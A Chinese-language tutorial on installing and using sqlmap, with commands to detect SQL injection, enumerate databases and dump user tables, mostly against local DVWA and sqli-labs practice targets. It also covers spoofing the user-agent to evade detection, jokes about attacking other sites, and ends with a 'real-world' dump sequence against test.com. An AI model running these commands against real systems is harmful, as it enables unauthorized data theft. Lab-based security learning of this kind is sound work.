# SQL自动化注入工具安装

# 一、下载

Windows系统下载.zip

Linux系统下载tar.gz

官方下载链接

[https://sqlmap.org/](https://sqlmap.org/)

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759653195804-8b5c8731-19d3-4e1b-96f3-0434dc638b4b.png)

# 二、下载解压~

之后打开解压的路径，输入cmd，进入命令行

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759653276299-73ffd14f-f3a8-4e64-96f9-b8f75edbfac4.png)

# 三、进入

python sqlmap.py

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759653530800-d97a70dd-2ae6-41a5-84b5-d15a5544c7b2.png)

如果要查看使用方法的话，就用--help查看，例如：

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759653584213-474e2198-7674-4fc2-b0b7-503b507aca3e.png)

* * *

**kali Linux** 系统的话，自带sqlmap工具的，直接调用就行（有点厉害哦），例如：

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759653865167-a585e301-2bae-43ac-a5be-cb8c62e3e4c7.png)

# 四、单目标打击

在自己搭建的靶场或者去尝试注入别的网站（doge）

## (一) 测试是否存在漏洞
    
    
    python sqlmap.py -u http://127.0.0.1:8181/Less-1/?id=1
    python sqlmap.py -u ''http://127.0.0.1:8181/Less-1/?id=1&page=10'' -p page
    python sqlmap.py -u ''http://127.0.0.1:8181/Less-1/?id=1&page=10'' -p page --batch

**-u****** 指定URL

**-p** URL多参数时指定注入点

**-batch** 自动化测试，需要选择时全部默认Y（注入过程可能比较久）

## (二) 获取数据
    
    
    python sqlmap.py -u http://127.0.0.1:8181/Less-8/?id=1 --dbs
    python sqlmap.py -u http://127.0.0.1:8181/Less-8/?id=1 -D security --tables
    python sqlmap.py -u http://127.0.0.1:8181/Less-8/?id=1 -D security -T users --columns
    python sqlmap.py -u http://127.0.0.1:8181/Less-8/?id=1 -D security -T users -C id,username,password --dump

\--dbs 获取数据库名

\--tables 获取数据库表名

\--columns 获取字段名

-D,-T,-C 分别表示指定数据库、表、字段

\--dump 获取字段内容（慎用）

执行的记录结果保存再用户文件夹下的AppData/Local/sqlmap/output/里面

# 五、多目标

## (一) 需要登陆

把要测试的URL保存再txt里，然后使用-m,参数执行txt
    
    
    python sqlmap.py -m test.txt

需要登陆的情况下，dvwa靶场当例子：

先登录到dvwa，进入到SQL里面，随便键入一个信息

记得改难度，改成low，做实验

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759658619749-ef7d30b1-9056-43d4-9fc3-efe551dc7121.png)

bp抓包，看登录的cookie值，并复制下来，粘贴备用

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759658869895-6bfff494-054b-4f61-a6f3-a20b0fbd0051.png)

  

    
    
    python sqlmap.py -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit#" -p id --cookie "PHPSESSID=qa24a1hfss75prk5583r2al7hj; security=low" --dbs --batch
    
    
    PHPSESSID=qa24a1hfss75prk5583r2al7hj; security=low

图例：

这样就把带有登录的数据库爆表了，剩下的可以自行发挥。

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759659845617-bc473b7f-691c-4c8d-a124-5410f606e2a6.png)

  

* * *

* * *

如果不加cookie的话，会造成这样的问题...

注入到一半，发现需要登录...

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759661933307-642ebac4-29ba-45ae-a612-cd3afaa5454e.png)

* * *

* * *

cookie要测试的页面至于在登录的状态下才能访问，登录状态用cookie识别，GET型注入user-agent头会带有明显的Sqlmap表示，burp抓包试试看：

这个命令的意思是去监听目标地址的信息，代理设置成bp，让数据流经过bp抓包的
    
    
    python sqlmap.py -u http://127.0.0.1:8181/Less-1/?id=1 --proxy=http://127.0.0.1:8080 -batch

**记得打开拦截。这个是检查监听攻击目标地址的信息，emmmm流量分析是否有攻击者**

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759724506545-03551cd1-6b6e-4f85-af14-52c35ef1c6e4.png)

更改user_agetn头的信息

这两条任选一个就行，第一个为自动伪造（随机使用user_agent头），第二个手动指定。
    
    
    python sqlmap.py -u http://127.0.0.1:8181/Less-1/?id=1 --proxy=http://127.0.0.1:8080 -batch --random-agent
    python sqlmap.py -u http://127.0.0.1:8181/Less-1/?id=1 --proxy=http://127.0.0.1:8080 -batch --user-agent="Mozilla/4.0 (compatible; MSIE 6.0; windows NT 5.0; de) Opera 8.0"

伪造之后的，信息已经变了

记得打开拦截，检查是否伪造完成，之后就可以后续攻击操作了。

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759725276590-94d504ce-89bd-4c9b-8252-e16c8796a9fc.png)

* * *

* * *

SQL大概就是这么个玩法，后续会写更详细，更全面的SQL注入的文档。

# 六、实战步骤：
    
    
    # 1. 初步探测
    sqlmap -u "http://test.com/news.php?id=1" --batch --random-agent --delay=1
    
    # 2. 如果找到注入，获取数据库
    sqlmap -u "http://test.com/news.php?id=1" --batch --random-agent --delay=1 --dbs
    
    # 3. 假设发现数据库 'webapp'，查看表
    sqlmap -u "http://test.com/news.php?id=1" --batch --random-agent --delay=1 -D webapp --tables
    
    # 4. 假设发现表 'users'，提取数据
    sqlmap -u "http://test.com/news.php?id=1" --batch --random-agent --delay=1 -D webapp -T users --dump

---
*迁移自语雀文档，原始ID: rasgusdbmhks9zco*